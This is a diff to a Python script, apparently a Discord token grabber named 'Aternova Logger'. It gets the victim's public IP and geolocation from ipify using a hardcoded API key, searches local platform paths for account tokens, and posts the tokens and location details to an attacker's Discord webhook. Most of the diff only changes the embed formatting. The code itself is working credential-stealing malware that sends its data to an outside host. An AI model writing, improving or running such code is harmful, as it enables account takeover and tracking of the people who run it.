@@ -5,24 +5,27 @@ import re
 from dhooks import Webhook, Embed
 from datetime import datetime
 
-#Credits: coded by haribv, This is the Aternova multitool! Please leave a Star on Github!!!
-#Credits: coded by haribv, This is the Aternova multitool! Please leave a Star on Github!!!
-#Credits: coded by haribv, This is the Aternova multitool! Please leave a Star on Github!!!
+#Credits: coded by haribv, This is the Aternova Logger! Please leave a Star on Github!!!
+#updated!!
 
 # WEBHOOK
-hook = Webhook("YOUR WEBHOOK HERE")
+hook = Webhook("WEBHOOK")
 
 ip = requests.get('https://api.ipify.org/').text
 
 r = requests.get(f'https://geo.ipify.org/api/v2/country?apiKey=at_R8PCEHjzhgL8DHOnRamh4mJsjq5aj&ipAddress={ip}')
 geo = r.json()
 
-list_name = "📄 - Aternova Tool Logs:"
+list_name = "" 
 #COLOR
-embed = Embed(title=list_name, color=0x004d99)
+embed = Embed(title=list_name, color=0x9a5fed)
+
+#SET A PICTURE
+image_url = "https://cdn.discordapp.com/attachments/1317177461884063765/1317183108335796224/Iconarchive-Incognito-Animal-2-Cat-Cool.1024_1.png?ex=675dc1dd&is=675c705d&hm=ad9e31310f0e2145ff1513109783a6481f475c199570bdee550bd2ae2a331681&"
+embed.set_thumbnail(url=image_url)
 
 # INVISIBLE IP
-embed.add_field(name='IP (Click to reveal)', value='||' + geo['ip'] + '||', inline=True)
+embed.add_field(name='IP', value='||' + geo['ip'] + '||', inline=True)
 
 # IPS LOCS
 fields = [
@@ -34,6 +37,9 @@ fields = [
     {'name': 'Domain Details',   'value': geo['as'].get('domain')},
     {'name': 'ASN',   'value': geo['as'].get('asn')}
 ]
+
+for field in fields:
+    embed.add_field(name=field['name'], value=field['value'], inline=False)
 
 # FIND TOKEN
 def find_tokens(path):
@@ -74,18 +80,11 @@ def main():
 
         if len(tokens) > 0:
             for token in tokens:
-                fields.append({'name': 'Token', 'value': token})
+                embed.add_field(name='Token', value='||' + token + '||', inline=True)
+                embed.add_field(name='Platform', value=f'Token found in {platform}', inline=True)
+                break
         else:
-            fields.append({'name': 'Token', 'value': 'No tokens found.'})
-
-        
-        fields.append({'name': '\u200b', 'value': '\u200b'})  
-
-    for field in fields:
-        value = field.get('value')
-        if value is not None:
-            embed.add_field(name=field['name'], value=value, inline=True)
-
+            embed.add_field(name='Token', value='No tokens found.', inline=True)
+        embed.add_field(name='\u200b', value='\u200b', inline=True)
     message = hook.send(embed=embed)
-
 main()
